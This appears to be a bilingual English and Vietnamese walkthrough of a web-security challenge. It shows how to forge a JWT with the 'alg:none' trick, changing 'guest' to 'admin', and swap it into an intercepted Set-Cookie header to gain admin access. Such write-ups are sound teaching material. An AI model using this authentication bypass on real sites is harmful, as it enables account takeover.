@@ -1,0 +1,69 @@
+    Click Start the Challenge
+    Make sure you intercept the request and responses in Burp
+    Click "Login as Guest!"
+    Get the jwt cookie from the response. It should look like this:
+    Set-Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk
+
+ 😄 Extra Info  😄
+JWTs consist of base64-encoded data and they have three parts, separated by dots. HEADER.PAYLOAD.VERIFYSIGNATURE
+JWT bao gồm dữ liệu được mã hóa base64 và chúng có ba phần, được phân tách bằng dấu chấm. HEADER.PAYLOAD.VERIFYSIGNATURE
+
+HEADER (eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9)
+{"typ":"JWT","alg":"HS256"}
+
+PAYLOAD (eyJ1c2VybmFtZSI6Imd1ZXN0In0)
+{"username":"guest"}
+
+VERIFY SIGNATURE (OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk)
+
+:-> The "Hacking" :->
+Modifying the HEADER
+The alg field here indicates the algorithm used to sign the JWT. You need to change it from HS256 to none (for no signature at all):
+Trường alg ở đây chỉ ra thuật toán được sử dụng để ký JWT. Bạn cần thay đổi nó từ HS256 thành none (không có chữ ký nào cả):
+{"typ":"JWT","alg":"none"}
+
+That will give us a new base64 encoded string eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=
+Keep in mind that "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0" will be the first part of our token.
+
+Điều đó sẽ cung cấp cho chúng ta một chuỗi mã hóa base64 mới eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0 =
+Hãy nhớ rằng "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0" sẽ là phần đầu tiên của mã thông báo của chúng ta.
+
+Modifying the PAYLOAD
+Since we want to be admin, we will change guest to admin. I should look like this:
+{"username":"admin"}
+And that will give us again a new based64 string eyJ1c2VybmFtZSI6ImFkbWluIn0=
+Following the same logic, "eyJ1c2VybmFtZSI6ImFkbWluIn0" will be the second part of the token.
+
+Vì chúng ta muốn trở thành admin, chúng ta sẽ thay đổi guest thành admin. Tôi sẽ trông như thế này:
+{"username":"admin"}
+Và điều đó sẽ cung cấp cho chúng ta một chuỗi base64 mới eyJ1c2VybmFtZSI6ImFkbWluIn0 =
+Theo cùng một logic, "eyJ1c2VybmFtZSI6ImFkbWluIn0" sẽ là phần thứ hai của mã thông báo.
+
+Modifying the VERIFY SIGNATURE
+Since we are saying "none" in the HEADER (no signature), we don’t need a "VERIFY SIGNATURE field.
+
+Building the NEW JWT token
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.
+
+Replace the original Guest token with the New one and forward the traffic.
+Original Response was:
+HTTP/1.1 302 Found
+Server: nginx
+Date: Fri, 23 Aug 2019 15:13:50 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Set-Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk
+Location: index.php
+Content-Length: 0
+
+and the new should look like this:
+HTTP/1.1 302 Found
+Server: nginx
+Date: Fri, 23 Aug 2019 15:13:50 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Set-Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.
+Location: index.php
+Content-Length: 0
+
+After that you will see the message "Welcome admin to this website! :)"
